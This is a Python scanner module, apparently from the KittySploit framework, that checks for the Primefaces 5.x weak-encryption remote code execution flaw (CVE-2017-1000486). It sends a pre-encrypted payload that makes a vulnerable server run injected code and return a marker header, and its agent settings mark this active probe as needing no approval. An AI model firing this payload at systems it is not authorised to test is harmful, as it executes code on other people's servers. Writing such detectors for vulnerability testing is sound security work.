#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Primetek Primefaces 5."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Primetek Primefaces 5.x - Remote Code Execution Detection',
        'description': 'Primetek Primefaces 5.x is vulnerable to a weak encryption flaw resulting in remote code execution.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve2017', 'cve', 'primetek', 'rce', 'injection', 'kev', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/mogwailabs/CVE-2017-1000486',
            'https://github.com/pimps/CVE-2017-1000486',
            'https://blog.mindedsecurity.com/2016/02/rce-in-oracle-netbeans-opensource.html',
            'https://nvd.nist.gov/vuln/detail/CVE-2017-1000486',
            'https://cryptosense.com/weak-encryption-flaw-in-primefaces/',
        ],
        'cve': 'CVE-2017-1000486',
    }

    def run(self):
        path = '/javax.faces.resource/dynamiccontent.properties.xhtml'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Accept': '*/*', 'Content-Type': 'application/x-www-form-urlencoded', 'Accept-Encoding': 'gzip, deflate'}, data='pfdrt=sc&ln=primefaces&pfdrid=uMKljPgnOTVxmOB%2BH6%2FQEPW9ghJMGL3PRdkfmbiiPkUDzOAoSQnmBt4dYyjvjGhVbBkVHj5xLXXCaFGpOHe704aOkNwaB12Cc3Iq6NmBo%2BQZuqhqtPxdTA%3D%3D\n')
        if not r or r.status_code != 200:
            return False
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        header_any = ('Mogwailabs: CHECKCHECK',)
        if any(m in headers for m in header_any):
            self.set_info(severity='critical', reason='Primetek Primefaces 5.x - Remote Code Execution detected', path=path)
            return True
        return False

